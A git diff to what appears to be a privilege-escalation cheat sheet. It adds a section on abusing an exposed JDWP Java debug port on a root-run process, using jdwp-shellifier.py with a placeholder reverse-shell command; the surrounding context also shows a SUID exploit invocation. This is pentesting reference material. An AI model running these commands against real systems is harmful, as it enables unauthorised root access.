@@ -11,6 +11,7 @@ Index
     - [Exploit by secrets dump](#Exploit-by-secrets-dump)
 - [Windows.old directory](#Windows.old-directory)
 - [Linux DirtyPipe](#Linux-DirtyPipe)
+- [JDWP Java Debug](#JDWP-Java-Debu)
 
 ## System Enumeration
 ### General Info
@@ -206,3 +207,20 @@ If file with interesting perm. in presents (SUID):
 ./exploit /path/to/suid_binary
 ./exploit /usr/bin/passwd
 ```
+
+## JDWP Java Debug
+If a Java Application use JDWP is possible to interact and execute command with the user's application:
+
+Scenario:
+``` bash
+# an application run as root
+ps -ef|grep java
+root         853       1  0 06:23 ?        00:00:01 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
+
+# in this case the code in App.java is available, is pobble to interact to the DEBUG with jdwp-shellifier.py https://github.com/hugsy/jdwp-shellifier
+# Link: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
+./jdwp-shellifier.py -t $target -p 8000 --break-on 'java.lang.String.indexOf' --cmd '$REVERSE_SHELL_CMD'
+```
+
+This scenario need an interaction with the application to "invoke" the payload.
+
